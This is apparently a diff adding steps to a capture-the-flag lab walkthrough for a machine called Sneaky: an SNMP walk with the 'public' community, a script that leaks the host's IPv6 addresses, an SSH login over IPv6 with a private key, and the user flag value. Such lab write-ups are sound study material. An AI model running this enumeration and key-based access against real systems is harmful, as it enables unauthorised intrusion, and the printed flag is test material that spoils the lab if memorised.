@@ -19,3 +19,14 @@ PORT    STATE         SERVICE
 161/udp open|filtered snmp
 
 └─# snmpwalk -c public -v2c 10.10.10.20
+└─# python enyx.py 2c public 10.10.10.20
+[+] Grabbing IPv6.
+[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
+[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:2f89
+[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:2f89
+
+└─# ssh -i admin_key thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:2f89
+thrasivoulos@Sneaky:~$ id
+uid=1000(thrasivoulos) gid=1000(thrasivoulos) groups=1000(thrasivoulos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
+thrasivoulos@Sneaky:~$ cat user.txt
+9fe14f76222db23a770f20136751bdab
